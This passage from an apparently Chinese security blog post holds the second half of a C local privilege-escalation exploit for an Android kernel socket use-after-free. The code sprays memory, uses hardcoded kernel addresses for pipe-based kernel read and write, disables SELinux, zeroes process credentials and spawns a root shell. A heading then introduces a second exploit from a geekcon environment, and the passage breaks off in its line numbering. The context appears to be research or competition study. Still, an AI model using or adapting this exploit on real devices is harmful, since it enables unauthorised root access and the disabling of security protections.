sa2.sin_family = AF_UNSPEC;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; MAX_SOCK_NUM; i++)&#123;</span><br><span class="line">        vuln_sock[i] = socket(AF_INET,SOCK_DGRAM,IPPROTO_ICMP);</span><br><span class="line">        <span class="keyword">if</span>(vuln_sock[i] &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;create socket error: %s (%d)&quot;</span>, strerror(errno), errno);</span><br><span class="line">        &#125;</span><br><span class="line">        connect(vuln_sock[i],&amp;sa1,<span class="keyword">sizeof</span>(sa1));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; MAX_SOCK_NUM; i++)&#123;</span><br><span class="line">        connect(vuln_sock[i],&amp;sa2,<span class="keyword">sizeof</span>(sa2));</span><br><span class="line">        connect(vuln_sock[i],&amp;sa2,<span class="keyword">sizeof</span>(sa2));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmap_spray</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span>* mapped_page;</span><br><span class="line"></span><br><span class="line">    mmap_page_count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; MAX_MMAP_NUM; i++)&#123;</span><br><span class="line">        mmaped[i] = mmap(<span class="literal">NULL</span>, ONE_MMAP_SIZE , PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// PRIVATE POPULATE? seems unnecessary</span></span><br><span class="line">        <span class="keyword">if</span>(mmaped[i] == MAP_FAILED)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;mmap failed\\n&quot;</span>);</span><br><span class="line">            sleep(<span class="number">1</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span> ;j &lt; ONE_MMAP_SIZE/PAGE_SIZE; j++)&#123;</span><br><span class="line">            <span class="built_in">memset</span>((<span class="keyword">char</span>*)mmaped[i],<span class="number">0x41</span>,PAGE_SIZE);                 </span><br><span class="line">            mapped_page = (<span class="keyword">void</span>*)((<span class="keyword">char</span>*)mmaped[i]+j*PAGE_SIZE);</span><br><span class="line">            *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">char</span>*)mapped_page + SK_STAMP_OFFSET) = MAGIC_VALUE +  mmap_page_count;</span><br><span class="line">            mmap_per_page[mmap_page_count] = mapped_page;</span><br><span class="line">            mmap_page_count++;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_target_sk</span><span class="params">(<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">time</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> value;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> compare_value;</span><br><span class="line">    <span class="keyword">int</span> found = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    vuln_sock_index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = num ; i &lt; MAX_SOCK_NUM; i++)&#123;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;time, <span class="number">0x0</span>, <span class="keyword">sizeof</span>(time));</span><br><span class="line">        ret = ioctl(vuln_sock[i], SIOCGSTAMPNS, &amp;time);</span><br><span class="line">        value = ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)time.tv_sec * NSEC_PER_SEC) + time.tv_nsec;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; mmap_page_count; j++)&#123;</span><br><span class="line">            compare_value = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">char</span>*)mmap_per_page[j]+SK_STAMP_OFFSET);</span><br><span class="line">            <span class="keyword">if</span>( value == compare_value)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot; found a vuln sock, index: %d, maigc value: 0x%llx\\n&quot;</span>,i,value);</span><br><span class="line">                vuln_sock_index = i;</span><br><span class="line">                vuln_page = mmap_per_page[j];</span><br><span class="line">                found = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(found == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(found == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_kernel</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> k_addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>* u_addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    write(pipe_fd[<span class="number">1</span>],(<span class="keyword">void</span>*)k_addr,<span class="number">0x8</span>);</span><br><span class="line">    read(pipe_fd[<span class="number">0</span>],u_addr,<span class="number">0x8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_kernel</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> k_addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>* u_addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    write(pipe_fd[<span class="number">1</span>],u_addr,<span class="number">0x8</span>);</span><br><span class="line">    read(pipe_fd[<span class="number">0</span>],(<span class="keyword">void</span>*)k_addr,<span class="number">0x8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_kernel4</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> k_addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>* u_addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    write(pipe_fd[<span class="number">1</span>],u_addr,<span class="number">0x4</span>);</span><br><span class="line">    read(pipe_fd[<span class="number">0</span>],(<span class="keyword">void</span>*)k_addr,<span class="number">0x4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">disalbe_selinux</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> selinux_addr = <span class="number">0xFFFFFFC0006EB94C</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> disable = <span class="number">0x0</span>;</span><br><span class="line">    write_kernel(selinux_addr, &amp;disable);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,k,ret;</span><br><span class="line"></span><br><span class="line">    ret = maximize_fd_limit();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] set rlimlit, now rlim.rlim_cur: %d\\n&quot;</span>,ret);</span><br><span class="line">    mmap200200();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] mmap 0x200200 to avoid crash\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] step 1: create vuln socks\\n&quot;</span>);</span><br><span class="line">    create_vuln_socks();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] step 2: mmap spray\\n&quot;</span>);</span><br><span class="line">    mmap_spray();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] step 3: find the target sk\\n&quot;</span>);</span><br><span class="line">    ret = find_target_sk(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;didn&#x27;t find a usable sock...\\n&quot;</span>);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;then, go to root procedure\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// get root</span></span><br><span class="line">    <span class="comment">// kernel_setscokopt change addr_limit</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> kernel_setsockopt_addr = <span class="number">0xFFFFFFC000383C6C</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> kernel_setsockopt_ret = <span class="number">0xFFFFFFC000383CAC</span>;</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">char</span>*)vuln_page+<span class="number">0x2A0</span>) = <span class="number">0x0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">char</span>*)vuln_page+<span class="number">0x28</span>) = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)vuln_page;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">char</span>*)vuln_page) = kernel_setsockopt_addr;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">char</span>*)vuln_page+<span class="number">0x68</span>) = kernel_setsockopt_ret;</span><br><span class="line"></span><br><span class="line">    close(vuln_sock[vuln_sock_index]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// pipe r/w kernel</span></span><br><span class="line">    <span class="comment">// unsigned long long kernel_addr = 0xFFFFFFC000752A00;</span></span><br><span class="line">    <span class="comment">// unsigned long long user_data = 0xdeadbeef;</span></span><br><span class="line">    <span class="comment">// write_kernel(kernel_addr, &amp;user_data);</span></span><br><span class="line">    <span class="comment">// user_data = 0x0;</span></span><br><span class="line">    <span class="comment">// read_kernel(kernel_addr, &amp;user_data);</span></span><br><span class="line">    <span class="comment">// printf(&quot;read from kernel, user_data is 0x%llx\\n&quot;,user_data);</span></span><br><span class="line"></span><br><span class="line">    disalbe_selinux();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> mmap_min_addr = <span class="number">0xffffffc0006ea0f8</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> user_data = <span class="number">0</span>;</span><br><span class="line">    write_kernel(mmap_min_addr, &amp;user_data);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> test_value = <span class="number">1</span>;</span><br><span class="line">    read_kernel(mmap_min_addr, &amp;test_value);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;read from kernel, mmap_min_addr is 0x%llx\\n&quot;</span>,test_value);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmap 0 addr, and read task addr\\n&quot;</span>);</span><br><span class="line">    <span class="keyword">void</span> *addr;</span><br><span class="line">    addr = mmap((<span class="keyword">void</span>*)<span class="number">0x0</span>, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(addr == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed to mmap 0x0, exit and try again\\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// get cred addr</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] step n: find another target sk\\n&quot;</span>);</span><br><span class="line">    ret = find_target_sk(vuln_sock_index+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;didn&#x27;t find a usable sock...\\n&quot;</span>);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> leak_task_addr = <span class="number">0xFFFFFFC000530A58</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">char</span>*)vuln_page+<span class="number">0x2A0</span>) = <span class="number">0x0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">char</span>*)vuln_page+<span class="number">0x28</span>) = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)vuln_page;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">char</span>*)vuln_page) = leak_task_addr;</span><br><span class="line">    close(vuln_sock[vuln_sock_index]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;read task addr&quot;</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> task_addr = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(<span class="number">0x18</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;task addr : 0x%llx\\n&quot;</span>,task_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cred_in_task = task_addr+<span class="number">0x3a0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cred_addr = <span class="number">0</span>;</span><br><span class="line">    read_kernel(cred_in_task, &amp;cred_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cred_addr: 0x%llx\\n&quot;</span>,cred_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> cflag = <span class="number">0</span>;</span><br><span class="line">    write_kernel4((<span class="keyword">char</span>*)cred_addr+<span class="number">4</span>,&amp;cflag);</span><br><span class="line">    write_kernel4((<span class="keyword">char</span>*)cred_addr+<span class="number">8</span>,&amp;cflag);</span><br><span class="line">    write_kernel4((<span class="keyword">char</span>*)cred_addr+<span class="number">12</span>,&amp;cflag);</span><br><span class="line">    write_kernel4((<span class="keyword">char</span>*)cred_addr+<span class="number">16</span>,&amp;cflag);</span><br><span class="line">    write_kernel4((<span class="keyword">char</span>*)cred_addr+<span class="number">20</span>,&amp;cflag);</span><br><span class="line">    write_kernel4((<span class="keyword">char</span>*)cred_addr+<span class="number">24</span>,&amp;cflag);</span><br><span class="line">    write_kernel4((<span class="keyword">char</span>*)cred_addr+<span class="number">28</span>,&amp;cflag);</span><br><span class="line">    write_kernel4((<span class="keyword">char</span>*)cred_addr+<span class="number">32</span>,&amp;cflag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;get root shell\\n&quot;</span>);</span><br><span class="line">        execl(<span class="string">&quot;/system/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed to get root\\n&quot;</span>);</span><br><span class="line">        sleep(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;end\\n&quot;</span>);</span><br><span class="line">    sleep(<span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

        <h3 id="第二种exp-pipe-r-w-JOP泄露"   >
          <a href="#第二种exp-pipe-r-w-JOP泄露" class="heading-link"><i class="fas fa-link"></i></a><a href="#第二种exp-pipe-r-w-JOP泄露" class="headerlink" title="第二种exp - pipe r/w + JOP泄露"></a>第二种exp - pipe r/w + JOP泄露</h3>
      <p>geekcon 环境中给出的exp</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span 